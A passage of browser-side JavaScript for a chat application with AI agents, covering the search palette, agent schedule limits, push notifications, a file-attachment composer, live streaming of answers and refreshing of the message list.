      if (await copyText(text.replace(/\n$/, ""))) flashCopied(copyPre);
    }

    const copyMsg = t.closest("[data-copy-msg]");
    if (copyMsg) {
      const msg = copyMsg.closest(".msg");
      const md = $(".msg-main > .md", msg), bubble = $(".bubble", msg);
      const text = md ? (md._raw ?? md.textContent) : bubbleText(bubble);
      if (await copyText(text)) {
        copyMsg.classList.add("is-copied");
        setTimeout(() => copyMsg.classList.remove("is-copied"), 1600);
      }
    }

    const thumb = t.closest("[data-lightbox]");
    if (thumb && lightbox) { $("img", lightbox).src = thumb.dataset.lightbox; lightbox.hidden = false; }
    else if (lightbox && !lightbox.hidden && t.closest("#lightbox")) lightbox.hidden = true;

    const checkAll = t.closest("[data-check-all]");
    if (checkAll) for (const c of $$("input[name=names]:not(:disabled)", checkAll.closest("form"))) c.checked = true;

    // chat list actions
    const rename = t.closest("[data-rename]");
    if (rename) { e.preventDefault(); startRename(rename.dataset.rename); }
    const flag = t.closest("[data-flag]");
    if (flag) {
      closeMenus();
      const r = await post(flag.dataset.flag, { flag: flag.dataset.flagName, on: flag.dataset.on });
      if (r.ok) location.reload(); else flash(await errorText(r));
    }
    const del = t.closest("[data-delete]");
    if (del) {
      closeMenus();
      if (confirm(`Delete “${del.dataset.name}” for everyone? This cannot be undone.`)) {
        const r = await post(del.dataset.delete);
        if (!r.ok) { flash(await errorText(r)); return; }
        const deletedPath = del.dataset.delete.replace(/\/delete$/, "");
        if (location.pathname === deletedPath) location.href = "/"; else location.reload();
      }
    }
    const leave = t.closest("[data-leave]");
    if (leave) {
      closeMenus();
      if (confirm(`Leave “${leave.dataset.name}”?`)) {
        const r = await post(leave.dataset.leave);
        if (r.ok) location.href = "/"; else flash(await errorText(r));
      }
    }
  });

  document.addEventListener("keydown", (e) => {
    const mod = e.ctrlKey || e.metaKey;
    if (mod && e.shiftKey && (e.key === "o" || e.key === "O")) { e.preventDefault(); location.href = "/"; return; }
    if (mod && (e.key === "k" || e.key === "K")) {
      e.preventDefault();
      if (!palette) location.href = "/search";
      else if (palette.hidden) openPalette(); else closePalette();
      return;
    }
    if (palette && !palette.hidden && paletteKey(e)) return;
    if (e.key !== "Escape") return;
    if (lightbox && !lightbox.hidden) { lightbox.hidden = true; return; }
    setSidebar(false);
    closePanel();
    closeMenus();
  });

  // ---------- search and jump (Ctrl+K): pages, agents, chats, then message search ----------
  const palette = $("#palette"), paletteQ = $("#palette-q"), paletteDeep = $("#palette-deep");
  const RECENT_CHATS = 6; // chats listed before anything is typed
  let lastFocus = null;
  const palItems = () => $$(".pal-item", palette).filter((a) => !a.hidden);
  function selectPal(item) {
    for (const a of $$(".pal-item.is-sel", palette)) { a.classList.remove("is-sel"); a.removeAttribute("aria-selected"); }
    if (!item) return;
    item.classList.add("is-sel"); item.setAttribute("aria-selected", "true");
    item.scrollIntoView({ block: "nearest" });
  }
  function filterPalette() {
    const words = paletteQ.value.trim().toLowerCase().split(/\s+/).filter(Boolean);
    let chats = 0;
    for (const a of $$(".pal-item", palette)) {
      if (a.hasAttribute("data-always")) continue;
      const text = (a.textContent + " " + (a.dataset.k || "")).toLowerCase();
      let hit = words.every((w) => text.includes(w));
      if (hit && !words.length && a.classList.contains("pal-chat") && ++chats > RECENT_CHATS) hit = false;
      a.hidden = !hit;
    }
    // a group label is shown only while something under it is
    for (const label of $$(".pal-label", palette)) {
      let n = label.nextElementSibling, any = false;
      while (n && !n.classList.contains("pal-label")) { if (!n.hidden) any = true; n = n.nextElementSibling; }
      label.hidden = !any;
    }
    const q = paletteQ.value.trim();
    paletteDeep.href = q ? "/search?q=" + encodeURIComponent(q) : "/search";
    $("b", paletteDeep).textContent = q ? `Search inside messages for “${q}”` : "Search inside messages";
    selectPal(palItems()[0]);
  }
  function openPalette() {
    if (!palette || !palette.hidden) return;
    lastFocus = document.activeElement;
    closeMenus();
    palette.hidden = false;
    paletteQ.value = "";
    filterPalette();
    $("#palette-list").scrollTop = 0;
    paletteQ.focus();
  }
  function closePalette() {
    if (!palette || palette.hidden) return;
    palette.hidden = true;
    lastFocus?.focus?.();
  }
  // Returns true when the key was used by the open palette.
  function paletteKey(e) {
    if (e.key === "Escape") { closePalette(); return true; }
    if (e.key === "Enter") { e.preventDefault(); ($(".pal-item.is-sel", palette) || paletteDeep).click(); return true; }
    if (e.key !== "ArrowDown" && e.key !== "ArrowUp") return false;
    e.preventDefault();
    const items = palItems();
    const i = items.indexOf($(".pal-item.is-sel", palette));
    selectPal(items[(i + (e.key === "ArrowDown" ? 1 : items.length - 1)) % items.length]);
    return true;
  }
  paletteQ?.addEventListener("input", filterPalette);
  palette?.addEventListener("click", (e) => { if (e.target.closest(".pal-item")) palette.hidden = true; });
  palette?.addEventListener("mousemove", (e) => {
    const item = e.target.closest(".pal-item");
    if (item && !item.classList.contains("is-sel")) { for (const a of $$(".pal-item.is-sel", palette)) a.classList.remove("is-sel"); item.classList.add("is-sel"); }
  });

  // ---------- appearance: remembered in cookies so the server paints the right colours ----------
  function setCookie(name, value) { document.cookie = `${name}=${value}; path=/; max-age=31536000; samesite=lax`; }
  function setLook(kind, value) {
    document.documentElement.dataset[kind] = value;
    setCookie("kn_" + kind, value);
    const attr = kind === "theme" ? "themeSet" : "accentSet";
    for (const b of $$(kind === "theme" ? "[data-theme-set]" : "[data-accent-set]")) b.setAttribute("aria-pressed", String(b.dataset[attr] === value));
  }

  // ---------- new agent: the closed "Tools and access" box says in one line what is chosen ----------
  function sumChosen(box) {
    const out = $("[data-sum-out]", box);
    if (!out) return;
    const chosen = [];
    for (const el of $$("[data-sum]", box)) {
      const isSelect = el.tagName === "SELECT";
      const on = el.type === "checkbox" ? el.checked : isSelect ? el.value !== "none" : el.value.trim() !== "";
      if (on) chosen.push(el.dataset.sum + (isSelect && el.value === "read" ? " (read only)" : ""));
    }
    out.textContent = chosen.length ? chosen.join(" · ") : out.dataset.sumOut;
  }
  for (const box of $$("[data-sum-box]")) {
    sumChosen(box);
    box.addEventListener("input", () => sumChosen(box));
    box.addEventListener("change", () => sumChosen(box));
  }
  // a mistake sent the form back: open the box that holds the first marked field and put the cursor there
  const badField = $(".agent-new [aria-invalid=true]");
  if (badField) {
    for (let d = badField.closest("details"); d; d = d.parentElement.closest("details")) d.open = true;
    badField.focus();
  }

  // ---------- agent forms: the schedule and the daily limit must fit each other ----------
  // "Every 15 minutes" is 96 runs a day; with a limit of 48 the agent would stop at midday without a word.
  function paintLimitNotes(root) {
    for (const note of $$("[data-limit-note]", root || document)) {
      const form = note.closest("form");
      const cap = form?.elements.daily_runs, when = form?.elements.schedule_minutes;
      if (!cap || !when) continue;
      const minutes = parseInt(when.value, 10) || 0, limit = parseInt(cap.value, 10) || 0;
      const need = minutes > 0 ? Math.ceil(1440 / minutes) : 0;
      note.hidden = need <= limit;
      if (note.hidden) continue;
      $("[data-limit-text]", note).textContent = `That is ${need} runs a day, but this agent may make at most ${limit} automatic runs a day. It would stop early every day and wait for midnight (UTC).`;
      const fix = $("[data-limit-fix]", note);
      fix.textContent = `Allow ${need} a day`;
      fix.dataset.limitFix = need;
    }
  }
  paintLimitNotes();
  for (const kind of ["input", "change"]) document.addEventListener(kind, (e) => {
    if (e.target.name === "schedule_minutes" || e.target.name === "daily_runs") paintLimitNotes(e.target.form);
  });
  document.addEventListener("click", (e) => {
    const fix = e.target.closest("[data-limit-fix]");
    if (!fix) return;
    const form = fix.closest("form");
    form.elements.daily_runs.value = fix.dataset.limitFix;
    paintLimitNotes(form);
    flash(`Daily limit set to ${fix.dataset.limitFix} runs. ${form.classList.contains("agent-new") ? "" : "Save to keep it."}`);
  });
  document.addEventListener("htmx:afterSwap", (e) => paintLimitNotes(e.target));

  // ---------- sidebar: how many agents work right now, and which need a look ----------
  // Asked every 15 seconds while the page is in front, and right after an agent is started or paused.
  const sbAgents = $("#sb-agents[data-pulse]");
  function countPill(n, kind, title) {
    const pill = document.createElement("span");
    pill.className = "sb-count is-" + kind;
    pill.title = title;
    if (kind === "busy") { const dot = document.createElement("i"); dot.className = "status-dot is-busy"; pill.append(dot); }
    pill.append(String(n));
    return pill;
  }
  async function agentsPulse() {
    if (!sbAgents || document.hidden) return;
    let p;
    try {
      const r = await fetch("/agents/pulse", { headers: { "X-Requested-With": "fetch" } });
      if (!r.ok || !(r.headers.get("Content-Type") || "").includes("json")) return;
      p = await r.json();
    } catch { return; }
    const pills = [];
    if (p.trouble) pills.push(countPill(p.trouble, "warn", `${p.trouble} agent${p.trouble === 1 ? " needs" : "s need"} a look`));
    if (p.working) pills.push(countPill(p.working, "busy", `${p.working} agent${p.working === 1 ? "" : "s"} working now`));
    sbAgents.replaceChildren(...pills);
    for (const dot of $$("[data-agent-dot]")) {
      const a = p.agents[dot.dataset.agentDot];
      if (a) { dot.className = "status-dot is-" + a.state; dot.title = a.label; }
    }
  }
  if (sbAgents) {
    setInterval(agentsPulse, 15000);
    document.addEventListener("visibilitychange", agentsPulse);
    onReturn(agentsPulse);
    document.addEventListener("htmx:afterRequest", (e) => {
      if ((e.detail.pathInfo?.requestPath || "").startsWith("/agents/")) setTimeout(agentsPulse, 1200);
    });
  }

  // ---------- agent panel tabs (the open tab survives the panel being re-rendered) ----------
  function showTab(name) {
    if (!panel) return;
    panel.dataset.tab = name;
    for (const b of $$("[data-tab-btn]", panel)) b.setAttribute("aria-selected", String(b.dataset.tabBtn === name));
    panel.scrollTop = 0;
  }
  document.addEventListener("htmx:afterSwap", (e) => {
    if (panel && e.target === panel && $(".panel-tabs", panel)) {
      const keep = panel.scrollTop;
      showTab(panel.dataset.tab || "tasks");
      panel.scrollTop = keep;
    }
  });

  // in-page links on long pages (Settings): scroll inside the page area, and
  // open the right place when arriving with /settings#tools
  // Goes to the part of a page named after the # in the address, and marks a
  // post or a task for a moment (a notification opens the page at it).
  const jumpTo = (hash) => {
    let el = null;
    try { el = $(hash); } catch { /* not a selector */ }
    if (!el) return;
    el.scrollIntoView({ behavior: "smooth", block: el.matches(".feed-post, .plan-task") ? "center" : "start" });
    if (el.matches(".feed-post, .plan-task")) { el.classList.add("is-target"); setTimeout(() => el.classList.remove("is-target"), 2500); }
  };
  window.addEventListener("hashchange", () => { if (location.hash && $(".page-scroll")) jumpTo(location.hash); });
  document.addEventListener("click", (e) => {
    const a = e.target.closest('a[href^="#"]');
    if (a && a.getAttribute("href").length > 1 && !a.classList.contains("skip-link")) { e.preventDefault(); jumpTo(a.getAttribute("href")); }
  });
  if (location.hash && $(".page-scroll")) jumpTo(location.hash);

  // The chat list remembers what the server sent for each row, before it is drawn (see swapMessages).
  for (const row of $("#messages")?.children || []) row._src = row.outerHTML;
  renderAll(document);

  // ---------- help pages: "On this page" list built from the guide's headings ----------
  const helpToc = $("#help-toc"), helpBody = $("#help-body");
  if (helpToc && helpBody) {
    for (const h of $$("h2", helpBody)) {
      const b = Object.assign(document.createElement("button"), { type: "button", className: "chip", textContent: h.textContent });
      b.addEventListener("click", () => h.scrollIntoView({ behavior: "smooth", block: "start" }));
      helpToc.append(b);
    }
    helpToc.hidden = helpToc.children.length < 2;
    // Links inside a guide ("see Plan Book") point at a heading the way GitHub names it:
    // lower case, punctuation dropped, spaces as hyphens. Give the headings those names and scroll to them.
    for (const h of $$("h2, h3", helpBody)) {
      if (!h.id) h.id = h.textContent.trim().toLowerCase().replace(/[^\p{L}\p{N} -]/gu, "").replace(/ /g, "-");
    }
    helpBody.addEventListener("click", (e) => {
      const a = e.target.closest('a[href^="#"]');
      const to = a && document.getElementById(decodeURIComponent(a.getAttribute("href").slice(1)));
      if (!to) return;
      e.preventDefault();
      to.scrollIntoView({ behavior: "smooth", block: "start" });
    });
  }
  // forms that ask before doing something that cannot be undone
  document.addEventListener("submit", (e) => {
    const msg = e.target.dataset?.confirm;
    if (msg && !confirm(msg)) e.preventDefault();
  });

  // ---------- service worker (PWA) + push on the settings page ----------
  if ("serviceWorker" in navigator && location.protocol === "https:" || location.hostname === "localhost") {
    navigator.serviceWorker?.register("/sw.js").catch(() => { /* optional */ });
  }
  const pushCard = $("#push-card");
  if (pushCard) {
    const vapid = body.dataset.vapid || "";
    const status = $("#push-status");
    const btnOn = $("[data-push-enable]"), btnOff = $("[data-push-disable]"), btnTest = $("[data-push-test]");
    const supported = "serviceWorker" in navigator && "PushManager" in window && vapid;
    const b64ToU8 = (s) => { const p = "=".repeat((4 - s.length % 4) % 4); const b = atob((s + p).replace(/-/g, "+").replace(/_/g, "/")); return Uint8Array.from(b, (c) => c.charCodeAt(0)); };
    async function current() {
      try { const reg = await navigator.serviceWorker.ready; return await reg.pushManager.getSubscription(); } catch { return null; }
    }
    async function refreshUI() {
      if (!supported) { status.textContent = "Not supported in this browser"; btnOn.disabled = true; return; }
      const sub = await current();
      btnOn.hidden = !!sub; btnOff.hidden = !sub;
      if (sub) status.textContent = "Enabled on this device";
      else if (Notification.permission === "denied") { status.textContent = "Blocked. Allow notifications for this site in your browser settings"; btnOn.disabled = true; }
    }
    btnOn.addEventListener("click", async () => {
      btnOn.disabled = true;
      try {
        const perm = await Notification.requestPermission();
        if (perm !== "granted") { flash("Notifications were not allowed."); return; }
        const reg = await navigator.serviceWorker.ready;
        const sub = await reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: b64ToU8(vapid) });
        const r = await post("/settings/push", { json: sub.toJSON() });
        if (!r.ok) { flash(await errorText(r)); await sub.unsubscribe(); return; }
        btnTest.hidden = false;
        flash("Notifications enabled on this device.");
      } catch (err) { flash("Could not enable notifications: " + (err.message || err)); }
      finally { btnOn.disabled = false; refreshUI(); }
    });
    btnOff.addEventListener("click", async () => {
      const sub = await current();
      if (sub) { await post("/settings/push/unsubscribe", { json: { endpoint: sub.endpoint } }); await sub.unsubscribe(); }
      flash("Notifications disabled on this device.");
      refreshUI();
    });
    btnTest?.addEventListener("click", async () => {
      const r = await post("/settings/push/test");
      flash(r.ok ? "Test notification sent." : await errorText(r));
    });
    if (navigator.serviceWorker) navigator.serviceWorker.register("/sw.js").then(refreshUI, refreshUI); else refreshUI();
  }

  // ===================================================== composer (home + chat)
  const MAX_DIM = 2048, MAX_IMAGE = 10 * 1024 * 1024, MAX_FILE = 20 * 1024 * 1024;
  const IMG_TYPES = /^image\/(png|jpeg|webp|gif)$/;
  const isImage = (f) => IMG_TYPES.test(f.type);

  // Downscale big photos on the device: faster uploads, fewer image tokens.
  async function prepareImage(file) {
    if (file.type === "image/gif") {
      if (file.size > MAX_IMAGE) throw new Error("GIFs must be under 10 MB.");
      return file;
    }
    try {
      const bmp = await createImageBitmap(file);
      const scale = Math.min(1, MAX_DIM / Math.max(bmp.width, bmp.height));
      if (scale === 1 && file.size <= 1.5 * 1024 * 1024) { bmp.close?.(); return file; }
      const canvas = document.createElement("canvas");
      canvas.width = Math.round(bmp.width * scale);
      canvas.height = Math.round(bmp.height * scale);
      canvas.getContext("2d").drawImage(bmp, 0, 0, canvas.width, canvas.height);
      bmp.close?.();
      const type = file.type === "image/png" ? "image/png" : "image/jpeg";
      const blob = await new Promise((res) => canvas.toBlob(res, type, 0.88));
      if (!blob) return file;
      const name = (file.name || "image").replace(/\.\w+$/, "") + (type === "image/png" ? ".png" : ".jpg");
      const out = new File([blob], name, { type });
      if (out.size > MAX_IMAGE) throw new Error("That image is too large even after resizing.");
      return out;
    } catch (err) {
      if (err instanceof Error && /large/.test(err.message)) throw err;
      if (file.size > MAX_IMAGE) throw new Error("Images must be under 10 MB.");
      return file; // decoding failed: let the server decide
    }
  }

  function setupComposer(form, { onSubmit }) {
    const ta = $("textarea", form);
    const card = $(".composer-card", form);
    const tray = $(".att-tray", form);
    const fileInput = $(".file-input", form);
    const attachBtn = $("[data-attach]", form);
    const sendBtn = $("button[type=submit]", form);
    const maxFiles = Number(form.dataset.maxFiles || $("#chat")?.dataset.maxFiles || 6);
    let vision = form.dataset.vision !== "false";
    const files = []; // { file, url, el, ready }

    const update = () => {
      const busy = files.some((f) => !f.ready);
      sendBtn.disabled = busy || (!ta.value.trim() && files.length === 0);
      tray.hidden = files.length === 0;
    };

    async function addFiles(list) {
      for (const file of list) {
        if (files.length >= maxFiles) { flash(`You can attach up to ${maxFiles} files.`); break; }
        if (isImage(file) && !vision) { flash("This model can't read images. Pick a model that can, or attach a document."); continue; }
        if (!isImage(file) && file.size > MAX_FILE) { flash(`${file.name} is larger than 20 MB.`); continue; }
        if (!isImage(file) && file.type.startsWith("image/")) { flash(`${file.name}: only PNG, JPEG, WebP or GIF images are supported.`); continue; }
        const item = { file, ready: false, url: isImage(file) ? URL.createObjectURL(file) : "" };
        item.el = document.createElement("div");
        if (isImage(file)) {
          item.el.className = "att is-loading";
          item.el.innerHTML = `<img alt=""><button type="button" class="att-x" aria-label="Remove">${ICON_X}</button>`;
          $("img", item.el).src = item.url;
        } else {
          item.el.className = "att att-file";
          item.el.innerHTML = `${ICON_FILE}<span class="att-name"></span><small></small><button type="button" class="att-x" aria-label="Remove">${ICON_X}</button>`;
          $(".att-name", item.el).textContent = file.name;
          $("small", item.el).textContent = fmtBytes(file.size);
        }
        $(".att-x", item.el).addEventListener("click", () => remove(item));
        files.push(item);
        tray.append(item.el);
        update();
        try {
          if (isImage(file)) item.file = await prepareImage(file);
          item.ready = true;
          item.el.classList.remove("is-loading");
        } catch (err) {
          flash(err.message);
          remove(item);
        }
        update();
      }
    }
    function remove(item) {
      const i = files.indexOf(item);
      if (i >= 0) files.splice(i, 1);
      item.el.remove();
      if (item.url) URL.revokeObjectURL(item.url);
      update();
    }
    function clear() {
      for (const f of [...files]) remove(f);
      ta.value = ""; autosize(ta); update();
    }

    attachBtn?.addEventListener("click", () => fileInput.click());
    fileInput.addEventListener("change", () => { addFiles([...fileInput.files]); fileInput.value = ""; });
    ta.addEventListener("paste", (e) => {
      const pasted = [...(e.clipboardData?.files || [])];
      if (pasted.length) { e.preventDefault(); addFiles(pasted); }
    });
    ta.addEventListener("input", () => { autosize(ta); update(); });
    ta.addEventListener("keydown", (e) => {
      if (isTouch || e.key !== "Enter" || e.shiftKey || e.isComposing) return;
      e.preventDefault();
      if (!sendBtn.disabled) form.requestSubmit();
    });
    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      if (sendBtn.disabled) return;
      sendBtn.disabled = true;
      try { await onSubmit({ text: ta.value.trim(), files: files.map((f) => f.file), clear }); }
      finally { update(); }
    });

    // drag & drop anywhere on the page
    const overlay = $("#drop-overlay");
    let depth = 0;
    const hasFiles = (e) => [...(e.dataTransfer?.types || [])].includes("Files");
    addEventListener("dragenter", (e) => { if (!hasFiles(e)) return; e.preventDefault(); if (depth++ === 0) { overlay.hidden = false; card.classList.add("is-drag"); } });
    addEventListener("dragleave", (e) => { if (!hasFiles(e)) return; if (--depth <= 0) { depth = 0; overlay.hidden = true; card.classList.remove("is-drag"); } });
    addEventListener("dragover", (e) => { if (hasFiles(e)) e.preventDefault(); });
    addEventListener("drop", (e) => {
      if (!hasFiles(e)) return;
      e.preventDefault(); depth = 0; overlay.hidden = true; card.classList.remove("is-drag");
      addFiles([...e.dataTransfer.files]);
    });

    update();
    return { ta, update, setVision(v) { vision = v; } };
  }

  // ---------- home page: start a new chat ----------
  const homeForm = $("#home-form");
  if (homeForm) {
    const greeting = $("#greeting");
    if (greeting) {
      const h = new Date().getHours();
      const part = h < 5 ? "Good evening" : h < 12 ? "Good morning" : h < 18 ? "Good afternoon" : "Good evening";
      greeting.textContent = `${part}, ${greeting.dataset.name}`;
    }
    const composer = setupComposer(homeForm, {
      async onSubmit({ text, files }) {
        const fd = new FormData();
        fd.append("content", text);
        fd.append("model_id", $("#model-select").value);
        for (const c of $$("input[name=agent]:checked", homeForm)) fd.append("agent", c.value);
        // the Tools menu: what stays on, and the groups this chat is connected to
        if ($("input[name=tools_menu]", homeForm)) {
          fd.append("tools_menu", "1");
          for (const c of $$("input[name=tool_on]:checked", homeForm)) fd.append("tool_on", c.value);
        }
        files.forEach((f) => fd.append("files", f, f.name));
        try {
          const r = await post("/t", fd);
          if (r.ok && r.redirected) { location.href = r.url; return; }
          flash(r.ok ? "Could not start the chat." : await errorText(r));
        } catch { flash("Network error. Please try again."); }
      },
    });
    // tools unticked before the first message: the switch follows the box, and the pill says how many are off
    const toolsCount = $("[data-tools-count]", homeForm);
    if (toolsCount) homeForm.addEventListener("change", (e) => {
      if (!e.target.matches("input[name=tool_on]")) return;
      e.target.nextElementSibling?.classList.toggle("is-on", e.target.checked);
      const n = $$("input[name=tool_on]:not([data-group]):not(:checked)", homeForm).length; // groups are extras, not tools switched off
      toolsCount.textContent = `${n} off`; toolsCount.hidden = n === 0;
    });
    // The Tools menu opens toward the side with more room and never grows past the window: with a quoted
    // message above it ("Take to my chat") the box sits low, and the list got longer with the groups.
    const toolsPick = $("details.tools-pick", homeForm);
    if (toolsPick) toolsPick.addEventListener("toggle", () => {
      const menu = $(".menu", toolsPick);
      toolsPick.classList.remove("opens-up"); menu.style.maxHeight = "";
      if (!toolsPick.open || matchMedia("(max-width: 640px)").matches) return; // on a phone it is a sheet at the bottom
      const box = toolsPick.getBoundingClientRect();
      const below = innerHeight - box.bottom, above = box.top;
      const up = below < menu.scrollHeight + 12 && above > below;
      toolsPick.classList.toggle("opens-up", up);
      menu.style.maxHeight = Math.max(180, Math.min(460, (up ? above : below) - 16)) + "px";
    });
    // agents picked before the first message: show how many are ticked
    const agentCount = $("[data-agent-count]", homeForm);
    if (agentCount) homeForm.addEventListener("change", (e) => {
      if (!e.target.matches("input[name=agent]")) return;
      const n = $$("input[name=agent]:checked", homeForm).length;
      agentCount.textContent = n; agentCount.hidden = n === 0;
    });
    const sel = $("#model-select");
    const syncVision = () => composer.setVision(sel.selectedOptions[0]?.dataset.vision === "true");
    sel.addEventListener("change", syncVision);
    syncVision();
    for (const s of $$("[data-prompt]")) {
      s.addEventListener("click", () => {
        composer.ta.value = s.dataset.prompt;
        autosize(composer.ta); composer.update(); composer.ta.focus();
      });
    }
    // "Take to my chat": the box already quotes a message of a group; type after it
    if (composer.ta.hasAttribute("data-caret-end")) {
      autosize(composer.ta); composer.update(); composer.ta.focus();
      composer.ta.setSelectionRange(composer.ta.value.length, composer.ta.value.length);
      composer.ta.scrollTop = composer.ta.scrollHeight;
    } else if (!isTouch) composer.ta.focus();
  }

  // ===================================================== chat view
  const chat = $("#chat");
  if (!chat) return;
  const threadID = chat.dataset.thread;
  const scroller = $("#scroller");
  const toBottomBtn = $("#to-bottom");
  const nearBottom = () => scroller.scrollHeight - scroller.scrollTop - scroller.clientHeight < 160;
  const toBottom = (smooth) => scroller.scrollTo({ top: scroller.scrollHeight, behavior: smooth ? "smooth" : "auto" });
  // The arrow shows as soon as something is below the view: an answer that stopped following may end just out of sight.
  const updateToBottom = () => { if (toBottomBtn) toBottomBtn.hidden = scroller.scrollHeight - scroller.scrollTop - scroller.clientHeight < 24; };
  scroller.addEventListener("scroll", updateToBottom, { passive: true });

  // While an answer is written the view follows it only until the answer's
  // first line reaches the top of the screen. From there the page stays still
  // and the text grows below, so what is being read does not move. The round
  // arrow goes to the end and follows the whole answer (followAll), until the
  // reader scrolls by hand or the answer is finished.
  const TOP_GAP = 12;
  let followAll = false, jump = 0; // jump: until this moment, show the end whatever the view was (the reader just sent something)
  function follow() {
    const end = scroller.scrollHeight - scroller.clientHeight;
    let to = end;
    const last = $$("#messages > .msg").pop();
    if (!followAll && last?.classList.contains("msg-ai")) {
      const top = last.getBoundingClientRect().top - scroller.getBoundingClientRect().top + scroller.scrollTop - TOP_GAP;
      to = Math.min(end, Math.max(top, scroller.scrollTop)); // never past the answer's first line, never back up
    }
    if (to > scroller.scrollTop) scroller.scrollTop = to;
  }
  toBottomBtn?.addEventListener("click", () => { followAll = !!$("#messages .msg-ai[data-status=streaming]"); toBottom(true); });
  for (const ev of ["wheel", "touchmove", "keydown"]) scroller.addEventListener(ev, () => { followAll = false; }, { passive: true });

  // Deep link from search: /t/ID#mNNN scrolls to the message and highlights it.
  function jumpToHash() {
    if (!location.hash) { toBottom(); return; }
    const el = $(location.hash);
    if (el) { el.scrollIntoView({ block: "center" }); el.classList.add("is-target"); setTimeout(() => el.classList.remove("is-target"), 2500); }
    else toBottom();
  }
  jumpToHash();
  window.addEventListener("hashchange", () => { if (location.hash) jumpToHash(); }); // a notification tapped while this chat is open

  // A freshly installed agent opens with its settings panel (/t/ID#setup).
  if (location.hash === "#setup") {
    const btn = $("#panel-toggle");
    history.replaceState(null, "", location.pathname);
    if (panel) panel.dataset.tab = "setup";
    if (btn && window.htmx) htmx.ajax("GET", btn.getAttribute("hx-get"), { target: "#panel", swap: "innerHTML" });
  }

  // "summarised" divider after the last message folded into the memory
  function markSummarised(root) {
    for (const d of $$(".summary-divider", root)) d.remove();
    const all = $$(".is-summarised", root);
    const last = all[all.length - 1];
    if (last && last.nextElementSibling && !last.nextElementSibling.classList.contains("is-summarised")) {
      const d = document.createElement("div");
      d.className = "summary-divider";
      d.innerHTML = "<span>Messages above are already in the summary</span>";
      last.after(d);
    }
  }

  // context meter in the top bar
  const ctx = $("#ctx-meter");
  function updateContext(list) {
    if (!ctx || !list) return;
    const pct = Number(list.dataset.contextPct || 0), used = Number(list.dataset.contextUsed || 0), win = Number(list.dataset.contextWindow || 0);
    ctx.dataset.pct = pct;
    $(".ctx-bar i", ctx).style.width = pct + "%";
    $(".ctx-text", ctx).textContent = pct + "%";
    ctx.title = win ? `The AI's reading space is ${pct}% full (about ${used.toLocaleString()} of ${win.toLocaleString()} tokens). When it fills up, older messages are summarised automatically; nothing is lost.` : "No model selected";
    ctx.classList.toggle("is-high", pct >= 80);
  }

  // ---------- live streaming state ----------
  // live[id] = { c: content text, r: reasoning text } streamed so far; survives
  // list refreshes because the database copy can lag by up to ~1s.
  const live = new Map();
  const dirty = new Set();
  // Words arrive far faster than they can be read. The answer is drawn at most
  // about ten times a second: steady for the eye and light for a phone.
  const PAINT_EVERY = 90;
  let frame = 0, lastPaint = 0;
  function paint(id) {
    dirty.add(id);
    if (frame) return;
    frame = setTimeout(() => requestAnimationFrame(() => {
      frame = 0;
      lastPaint = performance.now();
      const stick = nearBottom();
      for (const mid of dirty) {
        const st = live.get(mid);
        if (!st) continue;
        const msg = $(`#m${mid}`);
        if (!msg) continue;
        const md = $(".msg-main > .md", msg);
        if (md && st.c !== undefined) renderMD(md, st.c, true);
        if (st.r && chat.dataset.thinking !== "0") { // "0": the person switched thinking off in Settings
          let think = $(".thinking", msg);
          if (!think) {
            think = document.createElement("details");
            think.className = "thinking"; think.open = true;
            think.innerHTML = '<summary><span>Thinking…</span></summary><div class="md thinking-md"></div>';
            $(".msg-main", msg).prepend(think);
          }
          renderMD($(".thinking-md", think), st.r, true);
        }
      }
      dirty.clear();
      if (stick || followAll) follow();
      updateToBottom();
    }), Math.max(0, PAINT_EVERY - (performance.now() - lastPaint)));
  }
  const liveState = (id) => {
    if (!live.has(id)) {
      const md = $(`#m${id} .msg-main > .md`), th = $(`#m${id} .thinking-md`);
      live.set(id, { c: md ? (md._raw ?? md.textContent) : "", r: th ? (th._raw ?? th.textContent) : "" });
    }
    return live.get(id);
  };
  function onToken({ message_id: id, delta, len, kind }) {
    const st = liveState(id);
    const key = kind === "reasoning" ? "r" : "c";
    const cur = st[key] || "";
    if (len <= cur.length) return;                                // duplicate of snapshot
    if (cur.length + delta.length !== len) { resync(); return; }  // gap: events dropped
    st[key] = cur + delta;
    paint(id);
  }
  function onSnapshot({ message_id: id, content, reasoning }) { live.set(id, { c: content, r: reasoning || "" }); paint(id); }

  // ---------- message list refresh (coalesced, paused while editing) ----------
  let refreshing = false, again = false, deferred = false;
  const editing = () => !!$(".msg.is-editing");
  const oldestLoaded = () => Number($("#messages")?.dataset.oldest || 0);
  let historyFrom = 0; // >0 once the user loaded earlier pages
  async function refresh() {
    if (editing()) { deferred = true; return; }
    if (refreshing) { again = true; return; }
    refreshing = true;
    try {
      const r = await fetch(`/t/${threadID}/messages${historyFrom ? `?from=${historyFrom}` : ""}`);
      if (r.status === 401) { location.href = "/login"; return; }
      if (r.status === 404) { location.href = "/"; return; }
      if (!r.ok || editing()) { if (editing()) deferred = true; return; }
      const tmp = document.createElement("div");
      tmp.innerHTML = await r.text();
      const fresh = tmp.firstElementChild;
      const openKeys = new Set($$("#messages details[open]").map(detailsKey));
      const list = $("#messages");
      const stick = nearBottom();
      // The row at the top of the view, to keep it where it is when rows above it change.
      const edge = scroller.getBoundingClientRect().top;
      const held = [...list.children].find((el) => el.getBoundingClientRect().bottom > edge);
      const heldTop = held?.getBoundingClientRect().top;
      for (const el of swapMessages(list, fresh)) { renderAll(el); window.htmx?.process(el); }
      markSummarised(list);
      for (const d of $$("details", list)) if (openKeys.has(detailsKey(d))) d.open = true;
      for (const [id] of live) {
        const msg = $(`#m${id}`);
        if (!msg || msg.dataset.status !== "streaming") live.delete(id);
        else paint(id);
      }
      updateState();
      updateContext(list);
      if (Date.now() < jump) toBottom();
      else if (stick || followAll) follow();
      else {
        const now = held && (held.isConnected ? held : held.id && $("#" + held.id));
        if (now) scroller.scrollTop += now.getBoundingClientRect().top - heldTop;
      }
      jump = 0;
      if (!live.size) followAll = false; // the answer is finished
      updateToBottom();
    } catch (err) {
      console.warn("The chat could not be read again; it is tried when the connection is back.", err);
    } finally {
      refreshing = false;
      if (again) { again = false; refresh(); }
    }
  }
  const detailsKey = (d) => (d.previousElementSibling?.id || d.closest("[id]")?.id || "") + "|" + (d.querySelector("summary")?.textContent || "");

  // Puts the server's new list into the page without drawing everything again.
  // Each row remembers the HTML the server sent for it (_src). A row the server
  // sends unchanged stays exactly as it is on the screen; only new and changed
  // rows are put in, and only new ones slide in. Returns the rows put in.
  function swapMessages(list, fresh) {
